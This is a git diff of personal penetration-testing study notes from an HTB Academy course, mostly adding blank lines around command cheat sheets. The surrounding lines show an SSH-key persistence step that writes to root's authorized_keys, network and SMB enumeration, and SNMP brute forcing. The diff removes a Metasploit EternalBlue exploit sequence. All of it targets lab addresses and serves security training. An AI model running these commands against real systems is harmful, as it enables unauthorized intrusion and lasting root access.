@@ -92,6 +92,11 @@ We can now execute OS-level commands by adding a parameter to the GET request. i
 
 
 
+
+
+
+
+
 ## Linux Fundermentals (HTB Academy)
 * System Info Commands
 > uname -a - shows OS version
@@ -140,12 +145,19 @@ Always perform bash_history or PSReadLine after changing user
 
 * Generate SSH Keys
 > ssh private keys /home/user/.ssh/id_rsa or /root/.ssh/id_rsa
+
 Create a new SSH key
 > ssh-keygen -f key 	
+
 Add the generated public key to the user
 > echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys 	
+
 SSH to the server with the generated private key
 > ssh root@10.10.10.10 -i key 
+
+
+
+
 
 
 
@@ -196,6 +208,8 @@ Start the Metasploit Framework
 
 
 
+
+
 ### Nmap
 netstat -rn
 nmap -Pn -sC -sV -oA all_tcp -T4 --reason -vvvvvvvvvv -p- IP
@@ -207,6 +221,9 @@ smbclient -N -L \\\\10.129.42.253	List SMB Shares
 smbclient \\\\10.129.42.253\\users	Connect to an SMB share
 snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0	Scan SNMP on an IP
 onesixtyone -c dict.txt 10.129.42.254	Brute force SNMP secret string
+
+
+
 
 
 
@@ -251,15 +268,6 @@ netcat 10.10.10.10 22
 
 
 
-
-
-msfconsole
-search exploit eternalblue
-use exploit/windows/smb/ms17_010_psexec
-show options 
-set RHOSTS 10.10.10.40
-check
-exploit
 
  Service Enumeration
 nmap -sV -sC -p- 10.129.42.253
